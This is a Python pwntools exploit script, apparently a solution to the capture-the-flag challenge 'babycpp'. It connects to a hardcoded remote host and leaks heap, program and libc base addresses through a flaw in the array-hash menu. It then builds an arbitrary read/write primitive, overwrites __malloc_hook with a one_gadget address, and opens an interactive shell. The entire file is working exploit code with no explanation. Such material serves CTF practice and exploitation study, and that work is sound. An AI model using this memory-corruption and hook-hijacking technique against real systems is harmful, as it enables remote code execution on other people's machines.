#!/usr/bin/env python
# encoding: utf-8

from pwn import *

context(arch='amd64', os='linux', endian='little')
context.terminal = ['tmux', 'split', '-h']
r = None

def chose(n):
    r.sendlineafter("Your choice:", str(n))

def new_array(a0="2"):
    chose("0")
    r.sendafter("Your choice:", (str(a0)+"\n")[:])

def show_element(a0="\0"*0x10, a1=0):
    chose("1")
    r.sendafter("Input array hash:", (str(a0))[:])
    r.sendafter("Input idx:", (str(a1)+'\n')[:])

def set_str_element(a0="\0"*0x10, a1=0, a2=3, a3=4):
    chose("2")
    r.sendafter("Input array hash:", (str(a0))[:])
    r.sendafter("Input idx:", (str(a1)+'\n')[:])
    r.sendafter("Input the len of the obj:", (str(a2)+'\n')[:])
    r.sendafter("Input your content:", (str(a3))[:])

def set_int_element(a0="\0"*0x10, a1=0, a2=3, a3=4):
    chose("2")
    r.sendafter("Input array hash:", (str(a0))[:])
    r.sendafter("Input idx:", (str(a1)+'\n')[:])
    r.sendafter("Input val:", (hex(a2)[2:]+'\n')[:])

def update_hash(a0="\0"*0x10, a1=0, a2="\0"*0x10):
    chose("3")
    r.sendafter("Input array hash:", (str(a0))[:])
    r.sendafter("Input idx:", (str(a1)+'\n')[:])
    r.sendafter("Input hash:", (str(a2)+'\n')[:-1])

def exploit(host):
    global r
    port = 30207

    while True:
        try:
            r = remote(host, port)
            #r = process('./babycpp')
            from beautyexp import hook; hook(r)
            new_array(2)
            set_str_element('\0'*0x10, 0, 0x10, 'a'*0x10)
            update_hash('\0'*0x10, 0x80000000, p16(0x5ce0))
            show_element('\0'*0x10, 0)
            r.recvuntil('The value in the array is ')
            heap = int(r.recvline()[:-1], 16)-0xd0
            log.info('heap base 0x%016x' % heap)

            new_array(1)

            def arbitrary_rw(addr, size):
                set_int_element('\1'+'\0'*0xf, 0, addr)
                set_int_element('\1'+'\0'*0xf, 1, size)

            arbitrary_rw(heap+0x110, 8)

            set_int_element('\0'*0x10, 0, heap+0x140)
            update_hash('\0'*0x10, 0x80000000, p16(0x5d00))
            show_element('\0'*0x10, 0)
            r.recvuntil('Content:')
            elf_base = u64(r.recv(6).ljust(8, '\0'))-0x201CE0
            log.info('elf base 0x%016x' % elf_base)

            arbitrary_rw(elf_base+0x201FB8, 8)
            show_element('\0'*0x10, 0)
            r.recvuntil('Content:')
            libc_base = u64(r.recv(6).ljust(8, '\0'))-0x0000000000097070
            log.info('libc base 0x%016x' % libc_base)

            libc_malloc_hook = libc_base+0x3ebc30
            arbitrary_rw(libc_malloc_hook, 8)

            chose("2")
            r.sendafter("Input array hash:", '\0'*0x10)
            r.sendafter("Input idx:", '0\n')
            r.sendafter("Input your content:", p64(libc_base+0x4f322))

            # invoke
            #gdb.attach(r, 'symbol-file ./babycpp.dbg\nb *(0x555555554000+%d)'%(0xE5B))
            new_array(1)

            r.sendline('echo xdd')
            if r.recvuntil('xdd') == 'xdd':
                break
            else:
                r.close()

        except:
            r.close()

if __name__ == '__main__':
    host = '49.4.15.125'
    exploit(host)
    r.interactive()
